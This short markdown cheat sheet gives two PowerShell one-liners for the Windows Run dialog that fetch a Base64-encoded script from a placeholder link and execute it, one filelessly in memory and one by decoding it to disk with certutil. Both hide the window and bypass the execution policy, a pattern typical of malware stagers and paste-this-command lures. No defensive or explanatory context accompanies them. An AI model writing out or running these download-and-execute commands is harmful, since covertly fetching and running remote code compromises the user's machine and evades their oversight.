## Execute fileless Base64 encoded script from Run Dialog:

```powershell
powershell -NoP -W H -Ep Bypass &([scriptblock]::Create([Text.Encoding]::UTF8.GetString([Convert]::FromBase64String((irm LINK)))))
```

## Download and execute Base64 encoded script from Run Dialog:

```powershell
powershell -NoP -W H -Ep Bypass irm LINK -O $env:USERPROFILE\e.txt;certutil -f -decode $env:USERPROFILE\e.txt $env:USERPROFILE\d.ps1;iex $env:USERPROFILE\d.ps1
```
